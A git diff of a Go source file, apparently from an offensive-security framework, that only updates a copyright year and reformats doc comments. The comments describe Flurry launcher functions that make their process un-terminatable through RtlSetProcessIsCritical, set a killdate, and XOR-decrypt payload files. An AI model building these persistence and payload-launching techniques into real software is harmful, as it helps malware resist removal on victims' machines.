@@ -1,4 +1,4 @@
-// Copyright (C) 2020 - 2022 iDigitalFlame
+// Copyright (C) 2020 - 2023 iDigitalFlame
 //
 // This program is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -36,19 +36,20 @@ import (
 // This function will block and will NOT return (it calls 'device.GoExit').
 //
 // Arguments:
-//   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
-//               (Windows only obviously). And will make itself un-terminatable
-//               while running.
-//   killdate - If this is not zero, this specifies the date when this Flurry will
-//               stop functioning. This is represented in Unix epoch time.
-//   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
-//   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
-//               THIS NAME, it will be formatted based on the Linker type.
-//   key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
-//               data in the supplied files list.
-//   files    - List of files to check against. Each file will be checked in a
-//               random order and is expected to be encrypted using the supplied
-//               key value.
+//
+//	critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
+//	            (Windows only obviously). And will make itself un-terminatable
+//	            while running.
+//	killdate - If this is not zero, this specifies the date when this Flurry will
+//	            stop functioning. This is represented in Unix epoch time.
+//	l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
+//	guard    - String name for the Guardian to look for/create. DO NOT FORMAT
+//	            THIS NAME, it will be formatted based on the Linker type.
+//	key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
+//	            data in the supplied files list.
+//	files    - List of files to check against. Each file will be checked in a
+//	            random order and is expected to be encrypted using the supplied
+//	            key value.
 func Start(critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
 	defer func() {
 		if err := recover(); err != nil {
@@ -76,22 +77,23 @@ func Start(critical bool, killdate int64, l man.Linker, guard string, key []byte
 // This function will block and will NOT return (it calls 'device.GoExit').
 //
 // Arguments:
-//   wait     - Duration period to be used to run 'Start' with the arguments
-//               supplied. If this is less than or equal to zero, this function
-//               will run 'Start' and bail.
-//   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
-//               (Windows only obviously). And will make itself un-terminatable
-//               while running.
-//   killdate - If this is not zero, this specifies the date when this Flurry will
-//               stop functioning. This is represented in Unix epoch time.
-//   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
-//   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
-//               THIS NAME, it will be formatted based on the Linker type.
-//   key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
-//               data in the supplied files list.
-//   files    - List of files to check against. Each file will be checked in a
-//               random order and is expected to be encrypted using the supplied
-//               key value.
+//
+//	wait     - Duration period to be used to run 'Start' with the arguments
+//	            supplied. If this is less than or equal to zero, this function
+//	            will run 'Start' and bail.
+//	critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
+//	            (Windows only obviously). And will make itself un-terminatable
+//	            while running.
+//	killdate - If this is not zero, this specifies the date when this Flurry will
+//	            stop functioning. This is represented in Unix epoch time.
+//	l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
+//	guard    - String name for the Guardian to look for/create. DO NOT FORMAT
+//	            THIS NAME, it will be formatted based on the Linker type.
+//	key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
+//	            data in the supplied files list.
+//	files    - List of files to check against. Each file will be checked in a
+//	            random order and is expected to be encrypted using the supplied
+//	            key value.
 func Loop(wait time.Duration, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
 	if wait <= 0 {
 		Start(critical, killdate, l, guard, key, files)
@@ -158,23 +160,24 @@ loop:
 // (or a ServiceStop message in the case of Windows)
 //
 // Arguments:
-//   t        - Duration period to be used to run 'Start' with the arguments
-//               supplied. If this is less than or equal to zero, this function
-//               will run 'Start' and bail.
-//   name     - The service name when running under Windows. This may empty as it
-//               is ignored under *nix.
-//   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
-//               (Windows only obviously). And will make itself un-terminatable
-//               while running.
-//   killdate - If this is not zero, this specifies the date when this Flurry will
-//               stop functioning. This is represented in Unix epoch time.
-//   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
-//   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
-//               THIS NAME, it will be formatted based on the Linker type.
-//   key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
-//               data in the supplied files list.
-//   files    - List of files to check against. Each file will be checked in a
-//               random order
+//
+//	t        - Duration period to be used to run 'Start' with the arguments
+//	            supplied. If this is less than or equal to zero, this function
+//	            will run 'Start' and bail.
+//	name     - The service name when running under Windows. This may empty as it
+//	            is ignored under *nix.
+//	critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
+//	            (Windows only obviously). And will make itself un-terminatable
+//	            while running.
+//	killdate - If this is not zero, this specifies the date when this Flurry will
+//	            stop functioning. This is represented in Unix epoch time.
+//	l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
+//	guard    - String name for the Guardian to look for/create. DO NOT FORMAT
+//	            THIS NAME, it will be formatted based on the Linker type.
+//	key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
+//	            data in the supplied files list.
+//	files    - List of files to check against. Each file will be checked in a
+//	            random order
 func Daemon(t time.Duration, name string, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
 	var z bool
 	if critical {
